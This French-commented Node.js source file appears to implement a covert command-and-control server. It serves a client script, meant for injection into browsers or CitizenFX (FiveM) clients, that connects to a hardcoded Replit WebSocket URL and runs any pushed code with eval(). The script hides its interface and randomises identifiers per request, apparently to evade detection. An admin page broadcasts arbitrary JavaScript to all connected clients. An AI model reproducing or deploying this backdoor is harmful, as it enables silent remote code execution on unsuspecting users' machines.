const fs = require('fs');
const path = require('path');
const VariableRandomizer = require('../utils/randomizer');
const { sanitizeString } = require('../utils/security');
const logger = require('../utils/logger');
const config = require('../config/config');

/**
 * Gestionnaire des templates HTML
 */
class TemplateManager {
  constructor() {
    this.templatesPath = path.join(__dirname, '../templates');
    this.publicPath = path.join(__dirname, '../public');
  }

  /**
   * Génère la page d'accueil avec le client WebSocket intégré
   * @param {Object} req - Objet de requête
   * @returns {string} HTML généré
   */
  generateHomePage(req) {
    const clientCSS = this._readFile(path.join(this.publicPath, 'css/client.css'));

    // Appliquer la randomisation pour tous les clients sur la page d'accueil
    const randomNames = VariableRandomizer.generateMapping();
    let clientCode = this._getInlineClientCode();
    clientCode = VariableRandomizer.applyRandomization(clientCode, randomNames, req);
    
    // Créer le script inline avec les noms randomisés (sans récursion)
    const inlineScript = this._generateRandomizedInlineScript(randomNames);

    return `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket Client</title>
    <style>
${clientCSS}
    </style>
</head>
<body>
    <script>
${clientCode}

${inlineScript}
    </script>
</body>
</html>`;
  }

  /**
   * Génère le script inline avec les noms de fonctions randomisés
   * @private
   * @param {Object} randomNames - Mapping des noms randomisés
   * @returns {string} Script JavaScript avec noms randomisés
   */
  _generateRandomizedInlineScript(randomNames) {
    return `// Client WebSocket avec interface transparente
// Pas d'interface visible - seulement la logique JavaScript

// Fonctions silencieuses pour la compatibilité
function ${randomNames.toggleDebug}() {
    // Debug mode silencieux - logs dans la console du navigateur seulement
    if (typeof console !== 'undefined' && console.log) {
        console.log('[DEBUG] Mode debug activé - interface transparente');
    }
}

function ${randomNames.updateConnectionStatus}(status) {
    // Log silencieux du statut de connexion
    if (typeof console !== 'undefined' && console.log) {
        console.log('[STATUS]', status);
    }
}

function ${randomNames.addDebugLog}(message, type = 'info') {
    // Log silencieux dans la console du navigateur - utilise l'original pour éviter la récursion
    if (typeof ${randomNames.originalLog} === 'function') {
        ${randomNames.originalLog}.call(console, \`[CLIENT-\${type.toUpperCase()}]\`, message);
    }
}

// Sauvegarde des méthodes console originales
const ${randomNames.originalLog} = (typeof console !== 'undefined' && console.log) ? console.log.bind(console) : function() {};
const ${randomNames.originalError} = (typeof console !== 'undefined' && console.error) ? console.error.bind(console) : function() {};

// Override des méthodes du client pour les status silencieux
if (typeof window !== 'undefined' && window.${randomNames.clientInstance5x3m}) {
    const ${randomNames.originalConnect} = window.${randomNames.clientInstance5x3m}.${randomNames.connect};
    if (typeof ${randomNames.originalConnect} === 'function') {
        window.${randomNames.clientInstance5x3m}.${randomNames.connect} = function() {
            ${randomNames.updateConnectionStatus}('connecting');
            return ${randomNames.originalConnect}.call(this);
        };
    }
}

// Mise à jour des status via les événements WebSocket (silencieux)
// Compatible avec les iframes
(function() {
    function ${randomNames.setupWebSocketEvents}() {
        if (typeof window !== 'undefined' && window.${randomNames.clientInstance5x3m} && window.${randomNames.clientInstance5x3m}.${randomNames.socketConn7x1q}) {
            const ws = window.${randomNames.clientInstance5x3m}.${randomNames.socketConn7x1q};
            ws.addEventListener('open', () => ${randomNames.updateConnectionStatus}('connected'));
            ws.addEventListener('close', () => ${randomNames.updateConnectionStatus}('disconnected'));
            ws.addEventListener('error', () => ${randomNames.updateConnectionStatus}('disconnected'));
        }
    }
    
    // Essaye immédiatement et aussi après le chargement
    ${randomNames.setupWebSocketEvents}();
    
    if (typeof window !== 'undefined') {
        if (document.readyState === 'loading') {
            window.addEventListener('DOMContentLoaded', ${randomNames.setupWebSocketEvents});
        } else {
            // Document déjà chargé
            setTimeout(${randomNames.setupWebSocketEvents}, 100);
        }
    }
})();`;
  }

  /**
   * Génère la page d'administration
   * @param {Array} clients - Liste des clients connectés
   * @returns {string} HTML généré
   */
  generateAdminPage(clients) {
    const adminCSS = this._readFile(path.join(this.publicPath, 'css/admin.css'));
    const clientsCount = clients.length;
    const lastUpdate = new Date().toLocaleString();

    const clientsHTML = clientsCount === 0 
      ? '<div class="no-clients">Aucun client connecté actuellement.</div>'
      : clients.map(client => this._generateClientCard(client)).join('');

    return `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Administration WebSocket</title>
    <style>
${adminCSS}
    </style>
</head>
<body>
    <nav class="nav">
        <a href="/">🏠 Accueil</a>
        <a href="/admin">🔧 Administration</a>
    </nav>
    
    <h1>🌐 Serveur WebSocket - Administration</h1>
    
    <div class="stats">
        <h3>📊 Statistiques en temps réel</h3>
        <p><strong>Clients connectés:</strong> <span class="status-online"></span>${clientsCount}</p>
        <p><strong>Dernière mise à jour:</strong> ${lastUpdate}</p>
        <p><strong>Serveur WebSocket:</strong> Port ${config.ports.websocket}</p>
        <p><strong>Serveur HTTP:</strong> Port ${config.ports.http}</p>
    </div>

    <div class="broadcast-control">
        <h3>📡 Diffusion JavaScript</h3>
        <p>Envoyez du code JavaScript à exécuter sur tous les clients connectés :</p>
        <textarea id="broadcastCode" class="broadcast-textarea" placeholder="// Exemples de code JavaScript:
console.log('Message depuis le serveur!');
alert('Notification globale');
document.body.style.border = '3px solid #007bff';

// Fonction plus complexe
function showNotification(msg) {
    const div = document.createElement('div');
    div.style.cssText = 'position:fixed;top:20px;right:20px;padding:15px;background:#28a745;color:white;border-radius:5px;z-index:9999';
    div.textContent = msg;
    document.body.appendChild(div);
    setTimeout(() => div.remove(), 3000);
}
showNotification('Commande exécutée avec succès!');"></textarea>
        <br>
        <button class="broadcast-button" onclick="broadcastJS()">📡 Diffuser à Tous (${clientsCount})</button>
        <div id="broadcastResult" class="broadcast-result" style="display: none;"></div>
    </div>

    <h2>👥 Clients Connectés (${clientsCount}) 
        <button class="refresh-button" onclick="refreshPage()" title="Actualiser la page">🔄 Actualiser</button>
    </h2>
    ${clientsHTML}

    <div class="footer">
        <p><small>📡 WebSocket Server v1.0 - Sécurisé avec whitelist IP et validation User-Agent</small></p>
    </div>

    <script>
        function refreshPage() {
            location.reload();
        }

        function broadcastJS() {
            const code = document.getElementById('broadcastCode').value;
            const resultDiv = document.getElementById('broadcastResult');

            if (!code.trim()) {
                showBroadcastResult('⚠️ Veuillez entrer du code JavaScript', 'error');
                return;
            }

            showBroadcastResult('📤 Envoi du code à tous les clients...', 'info');

            fetch('/api/broadcast', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ code: code })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showBroadcastResult(\`✅ Code envoyé à \${data.successCount} client(s) avec succès!\`, 'success');
                    if (data.errorCount > 0) {
                        showBroadcastResult(\`⚠️ \${data.errorCount} erreur(s) détectée(s)\`, 'info');
                    }
                    // Effacer le code après envoi réussi
                    document.getElementById('broadcastCode').value = '';
                } else {
                    showBroadcastResult('❌ Erreur: ' + data.error, 'error');
                }
            })
            .catch(err => {
                showBroadcastResult('❌ Erreur réseau: ' + err.message, 'error');
            });
        }

        function showBroadcastResult(message, type) {
            const resultDiv = document.getElementById('broadcastResult');
            resultDiv.innerHTML = message;
            resultDiv.className = 'broadcast-result ' + type;
            resultDiv.style.display = 'block';
            
            // Masquer automatiquement après 5 secondes pour les succès
            if (type === 'success') {
                setTimeout(() => {
                    resultDiv.style.display = 'none';
                }, 5000);
            }
        }

        // Raccourci clavier Ctrl+Enter pour envoyer
        document.getElementById('broadcastCode').addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'Enter') {
                broadcastJS();
            }
        });
    </script>
</body>
</html>`;
  }

  /**
   * Génère une carte client pour l'administration
   * @private
   */
  _generateClientCard(client) {
    const connectedTime = new Date(client.connectedAt).toLocaleString();
    const lastSeenTime = new Date(client.lastSeen).toLocaleString();
    const isRecent = new Date() - new Date(client.lastSeen) < 60000; // 1 minute

    return `
    <div class="client-card">
        <div class="client-uuid">
            <span class="${isRecent ? 'status-online' : 'status-offline'}"></span>
            <a href="/client/${client.uuid}">🆔 ${client.uuid}</a>
        </div>
        <div class="client-info"><strong>IP:</strong> ${sanitizeString(client.ip)}</div>
        <div class="client-info"><strong>User-Agent:</strong> ${sanitizeString(client.userAgent, 100)}</div>
        <div class="client-info"><strong>Connecté:</strong> ${connectedTime}</div>
        <div class="client-info"><strong>Dernière activité:</strong> ${lastSeenTime}</div>
        <div class="client-info"><strong>Status:</strong> ${isRecent ? '🟢 Actif' : '🔴 Inactif'}</div>
    </div>`;
  }

  /**
   * Génère la page 404
   * @returns {string} HTML de la page 404
   */
  generate404Page() {
    return `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page Non Trouvée</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; margin: 40px; text-align: center; }
        .error-container { max-width: 500px; margin: 0 auto; }
        .error-code { font-size: 72px; font-weight: bold; color: #dc3545; margin: 0; }
        .error-message { font-size: 24px; color: #6c757d; margin: 20px 0; }
        .nav-links { margin-top: 40px; }
        .nav-links a { margin: 0 15px; color: #007bff; text-decoration: none; font-weight: 500; }
        .nav-links a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="error-container">
        <h1 class="error-code">404</h1>
        <p class="error-message">Page non trouvée</p>
        <div class="nav-links">
            <a href="/">🏠 Accueil</a>
            <a href="/admin">🔧 Administration</a>
        </div>
    </div>
</body>
</html>`;
  }

  /**
   * Retourne le code client JavaScript intégré
   * @private
   */
  _getInlineClientCode() {
    return `/**
 * Code JavaScript du client WebSocket
 * Ce code sera injecté dans le navigateur/CitizenFX
 */

class ClientNet3m8w {
  constructor(urlServer9k2v) {
    this.urlServer9k2v = urlServer9k2v;
    this.socketConn7x1q = null;
    this.userIdent4z8n = null;
    this.retryCount5p3j = 0;
    this.maxRetries6h9l = 5;
    this.pingTimer8w4r = null;
  }

  connect() {
    console.log(\`[CLIENT] Connexion vers \${this.urlServer9k2v}...\`);

    this.socketConn7x1q = new WebSocket(this.urlServer9k2v);

    this.socketConn7x1q.onopen = () => {
      console.log('[CLIENT] Connecté au serveur WebSocket');
      this.retryCount5p3j = 0;
      this.startPing();
    };

    this.socketConn7x1q.onmessage = (event) => {
      try {
        const message = JSON.parse(event.data);

        if (message.type === 'welcome') {
          this.userIdent4z8n = message.uuid;
          console.log(\`[CLIENT] UUID reçu: \${this.userIdent4z8n.substring(0, 8)}...\`);
        }

        if (message.type === 'execute_js') {
          try {
            const result = eval(message.code);
            this.sendMessage({
              type: 'js_executed',
              success: true,
              result: result !== undefined ? String(result) : 'Code exécuté avec succès',
              timestamp: new Date().toISOString(),
            });
          } catch (executeError) {
            console.error('[CLIENT] Erreur d\\'exécution JS:', executeError);
            this.sendMessage({
              type: 'js_executed',
              success: false,
              error: executeError.message,
              timestamp: new Date().toISOString(),
            });
          }
        }
      } catch (err) {
        console.log('[CLIENT] Erreur parse message:', err.message);
      }
    };

    this.socketConn7x1q.onclose = (event) => {
      console.log(\`[CLIENT] Connexion fermée (\${event.code})\`);
      this.stopPing();
      this.attemptReconnect();
    };

    this.socketConn7x1q.onerror = (error) => {
      console.log('[CLIENT] Erreur WebSocket:', error.message || error);
    };
  }

  sendMessage(message) {
    if (this.socketConn7x1q && this.socketConn7x1q.readyState === WebSocket.OPEN) {
      this.socketConn7x1q.send(JSON.stringify(message));
    } else {
      console.warn('[CLIENT] Impossible d\\'envoyer le message - WebSocket fermé');
    }
  }

  startPing() {
    this.pingTimer8w4r = setInterval(() => {
      this.sendMessage({
        type: 'ping',
        timestamp: new Date().toISOString(),
      });
    }, 30000);
  }

  stopPing() {
    if (this.pingTimer8w4r) {
      clearInterval(this.pingTimer8w4r);
      this.pingTimer8w4r = null;
    }
  }

  attemptReconnect() {
    if (this.retryCount5p3j < this.maxRetries6h9l) {
      this.retryCount5p3j++;
      const delay = Math.pow(2, this.retryCount5p3j) * 1000;

      console.log(\`[CLIENT] Reconnexion \${this.retryCount5p3j}/\${this.maxRetries6h9l} dans \${delay / 1000}s\`);

      setTimeout(() => {
        this.connect();
      }, delay);
    } else {
      console.log('[CLIENT] Reconnexion impossible - Limite atteinte');
    }
  }

  disconnect() {
    if (this.socketConn7x1q) {
      this.stopPing();
      this.socketConn7x1q.close();
      console.log('[CLIENT] Déconnexion manuelle');
    }
  }
}

// Configuration par défaut (URL fixe comme demandé)
const URL_CONFIG_Q4R7 = 'wss://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhgjkz4.kirk.replit.dev:3000';

// Initialisation automatique si dans un navigateur
// Compatible avec les iframes et le chargement différé
(function() {
  function initClient() {
    if (typeof window !== 'undefined' && typeof WebSocket !== 'undefined') {
      const clientInstance5x3m = new ClientNet3m8w(URL_CONFIG_Q4R7);
      window.clientInstance5x3m = clientInstance5x3m;
      clientInstance5x3m.connect();
    }
  }
  
  // Essaye d'initialiser immédiatement
  if (typeof window !== 'undefined') {
    if (document.readyState === 'loading') {
      // Document en cours de chargement
      window.addEventListener('DOMContentLoaded', initClient);
    } else {
      // Document déjà chargé
      initClient();
    }
  }
})();`;
  }

  /**
   * Lit un fichier de manière synchrone
   * @private
   */
  _readFile(filePath) {
    try {
      return fs.readFileSync(filePath, 'utf8');
    } catch (err) {
      logger.error(`Impossible de lire le fichier ${filePath}: ${err.message}`);
      return '';
    }
  }

  /**
   * Sert le code client avec randomisation pour CitizenFX
   * @param {Object} req - Objet de requête
   * @returns {string} Code client (possiblement randomisé)
   */
  serveClientCode(req) {
    let clientCode = this._getInlineClientCode();
    const userAgent = req.headers['user-agent'] || '';
    
    if (userAgent.includes('CitizenFX')) {
      // Appliquer la randomisation pour CitizenFX
      const randomNames = VariableRandomizer.generateMapping();
      clientCode = VariableRandomizer.applyRandomization(clientCode, randomNames, req);
      
      logger.info(`[CITFX] Code servi avec randomisation | UA: ${userAgent.substring(0, 50)}...`);
    }
    
    return clientCode;
  }
}

module.exports = TemplateManager;